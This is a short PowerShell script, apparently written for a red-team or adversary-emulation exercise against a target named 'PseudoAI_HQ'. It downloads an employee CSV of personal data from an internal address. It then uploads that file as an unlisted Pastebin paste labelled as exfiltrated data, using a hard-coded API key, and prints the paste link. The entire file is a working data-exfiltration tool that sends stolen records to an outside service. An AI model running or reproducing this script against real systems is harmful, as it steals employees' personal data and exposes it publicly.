# Define your Pastebin API Key (replace with your actual API key)
$apiKey = "83G5413gfaDH-_rwRuLYIEPJR3vLeWmE"

# Define the Pastebin API endpoint
$pasteApiUrl = "https://pastebin.com/api/api_post.php"

# Download the file from the specified URL and save it to the temporary path
Invoke-WebRequest "http://198.18.128.193/files/employee.csv" -OutFile "$env:temp\employee.csv"

# Define the path to the employee.csv file
$pii_data_path = "$env:temp\employee.csv"
$pii_data = Get-Content -Path $pii_data_path -Raw

# Prepare the body for the HTTP POST request as a hashtable
$body = @{
    "api_dev_key"        = $apiKey
    "api_option"         = "paste"
    "api_paste_code"     = $pii_data
    "api_paste_private"  = "1"  # Set to '1' for unlisted paste
    "api_paste_name"     = "Data_Exfiltrated_from_PseudoAI_HQ"
    "api_paste_expire_date" = "10M"
    "api_paste_format"   = "text"
}

# Send the HTTP POST request using Invoke-WebRequest
try {
    $response = Invoke-WebRequest -Uri $pasteApiUrl -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
    
    # Check if the response content is valid
    if ($response.Content -and $response.Content.StartsWith("http")) {
        Write-Host "Data exfiltrated to Pastebin: $($response.Content)"
    } else {
        # Throw a custom error if the response is invalid
        throw "Error: Pastebin did not generate a valid response. Check your API key or the data being uploaded."
    }
} catch {
    # Handle exceptions and output the error
    Write-Error "An error occurred: $_"
    exit 1
}
